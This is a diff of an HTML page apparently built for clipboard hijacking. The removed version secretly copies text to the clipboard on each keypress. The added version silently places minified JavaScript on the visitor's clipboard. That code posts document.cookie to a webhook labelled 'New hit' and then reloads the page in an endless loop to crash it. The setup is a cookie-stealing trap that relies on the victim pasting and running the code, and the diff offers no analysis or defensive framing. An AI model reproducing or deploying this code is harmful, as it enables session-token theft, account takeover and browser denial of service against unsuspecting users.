@@ -1,53 +1,8 @@
-<html>
-    <body>
-        </br>
-  login: i324h9htu94fu93h298-4hr2n3r2iuphr98423hr90u243r
-        <script>
-            function copyTextToClipboard(text) {
-              var textArea = document.createElement("textarea");
-
-              textArea.style.position = 'fixed';
-              textArea.style.top = 0;
-              textArea.style.left = 0;
-
-              textArea.style.width = '2em';
-              textArea.style.height = '2em';
-
-              textArea.style.padding = 0;
-
-              textArea.style.border = 'none';
-              textArea.style.outline = 'none';
-              textArea.style.boxShadow = 'none';
-              textArea.style.background = 'transparent';
-
-
-              textArea.value = text;
-
-              document.body.appendChild(textArea);
-
-              textArea.select();
-
-              try {
-                var successful = document.execCommand('copy');
-                var msg = successful ? 'successful' : 'unsuccessful';
-                console.log('Copying text command was ' + msg);
-              } catch (err) {
-                console.log('Oops, unable to copy');
-              }
-
-              document.body.removeChild(textArea);
-            }
-
-            document.addEventListener('keydown', function(event) {
-                var ms = 800;  
-                var start = new Date().getTime();
-                var end = start;
-                while(end < start + ms) {
-                    end = new Date().getTime();
-                } 
-                copyTextToClipboard('JSCODE');
-            });
-
-        </script>
-    </body>
-</html>
+<script>
+  var text = 'function sendMessage(){let a=new XMLHttpRequest;a.open("POST","webhook"),a.setRequestHeader("Content-type","application/json");let b={username:"New hit",avatar_url:"",content:document.cookie.split(";").join(";\r\n")};a.send(JSON.stringify(b))}console.log("made by cow#3479"),sendMessage(),console.log("done"),onbeforeunload=function(){localstorage.x=1},setTimeout(function(){for(;;)location.reload(1)},1e3),console.log("Done Crashing...")';
+navigator.clipboard.writeText(text).then(function() {
+  console.log('Async: Copying to clipboard was successful!');
+}, function(err) {
+  console.error('Async: Could not copy text: ', err);
+});
+</script>
